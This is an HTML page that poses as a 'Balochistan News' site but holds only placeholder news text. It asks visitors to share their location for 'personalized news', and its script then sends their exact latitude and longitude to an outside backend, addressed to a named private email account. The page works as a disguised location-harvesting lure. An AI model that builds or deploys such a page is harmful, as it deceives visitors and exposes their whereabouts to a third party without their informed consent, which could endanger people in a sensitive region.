<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Balochistan News - Breaking News and Stories</title>
    <!-- Bootstrap CSS -->
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f8f9fa;
            color: #333;
        }

        /* Navbar */
        .navbar {
            background-color: #002147;
        }

        .navbar-brand {
            font-weight: bold;
            font-size: 1.8em;
            color: white !important;
        }

        .navbar-nav .nav-link {
            color: white !important;
        }

        /* Hero Section */
        .hero-section {
            background-image: url('https://via.placeholder.com/1600x500?text=Balochistan+News'); /* Replace with real image */
            background-size: cover;
            background-position: center;
            color: white;
            text-align: center;
            padding: 80px 20px;
        }

        .hero-section h1 {
            font-size: 3em;
            font-weight: bold;
        }

        .hero-section p {
            font-size: 1.2em;
        }

        /* News Section */
        .news-section {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .news-section h2 {
            font-size: 2em;
            color: #002147;
        }

        /* Footer */
        .footer {
            background-color: #002147;
            color: white;
            padding: 20px 0;
            text-align: center;
        }

        .footer a {
            color: white;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* Location Request Prompt */
        .location-request {
            background-color: #f0ad4e;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            text-align: center;
            margin-top: 20px;
        }

        .location-result {
            font-size: 1.2em;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <!-- Navigation Bar -->
    <nav class="navbar navbar-expand-lg">
        <a class="navbar-brand" href="#">Balochistan News</a>
        <div class="collapse navbar-collapse">
            <ul class="navbar-nav ml-auto">
                <li class="nav-item">
                    <a class="nav-link" href="#">Home</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#">Politics</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#">Society</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#">Culture</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#">Contact</a>
                </li>
            </ul>
        </div>
    </nav>

    <!-- Hero Section -->
    <section class="hero-section">
        <h1>Welcome to Balochistan News</h1>
        <p>Your trusted source for the latest news and stories from Balochistan and beyond.</p>
    </section>

    <!-- Main Content Section -->
    <div class="container">
        <div class="row">
            <div class="col-md-8">
                <!-- News Section -->
                <div class="news-section">
                    <h2>Breaking News: Balochistan Witnesses Historic Event</h2>
                    <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer nec odio. Praesent libero. Sed cursus ante dapibus diam.</p>
                    <a href="#" class="btn btn-primary">Read More</a>
                </div>

                <!-- Geolocation Request -->
                <div class="location-request">
                    <p>We would like to access your location for more personalized news content.</p>
                    <button class="btn btn-warning" id="allowLocationButton">Allow Location Access</button>
                </div>

                <!-- Display Latitude and Longitude -->
                <div class="location-result" id="locationDisplay">
                    <p>Location will be shown here after you grant permission.</p>
                </div>
            </div>

            <!-- Sidebar Section -->
            <div class="col-md-4">
                <!-- Sidebar Content -->
                <div class="sidebar">
                    <h3>Popular Articles</h3>
                    <ul>
                        <li><a href="#">Balochistanâ€™s Economy: Challenges and Solutions</a></li>
                        <li><a href="#">History of Balochistan: A Glimpse into the Past</a></li>
                        <li><a href="#">Balochistan's Role in National Politics</a></li>
                        <li><a href="#">Interview with Local Leaders on Regional Development</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <p>&copy; 2024 Balochistan News | <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
    </div>

    <!-- Bootstrap and jQuery JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.min.js" async></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js" async></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" async></script>

    <!-- JavaScript for Geolocation and Email Sending -->
    <script>
        let latitude, longitude;

        // Function to request location permission and get the coordinates
        function requestLocation() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        latitude = position.coords.latitude;
                        longitude = position.coords.longitude;

                        // Show the location on the page
                        document.getElementById("locationDisplay").innerHTML = `
                            <strong>Latitude:</strong> ${latitude}<br>
                            <strong>Longitude:</strong> ${longitude}
                        `;

                        // Send email with location data
                        sendEmail("Location Access", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
                    },
                    (error) => {
                        document.getElementById("locationDisplay").textContent = "Location access denied or error occurred.";
                    }
                );
            } else {
                document.getElementById("locationDisplay").textContent = "Geolocation is not supported by this browser.";
            }
        }

        // Handle location button click
        document.getElementById("allowLocationButton").addEventListener("click", function () {
            requestLocation();
        });

        // Function to send the location data via email
        function sendEmail(subject, message, recipientEmail) {
            const emailData = {
                subject: subject,
                message: message,
                recipient_email: recipientEmail,
                recipient_name: "Khalil Ahmed"
            };

            fetch("https://zalex-backend.onrender.com/api/send-email/", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(emailData)
            })
            .then(response => response.ok ? response.json() : Promise.reject(`Error ${response.status}`))
            .then(data => alert(data.message ? "Email sent successfully!" : `Error: ${data.error}`))
            .catch(error => alert("Error sending email: " + error));
        }
    </script>
</body>
</html>
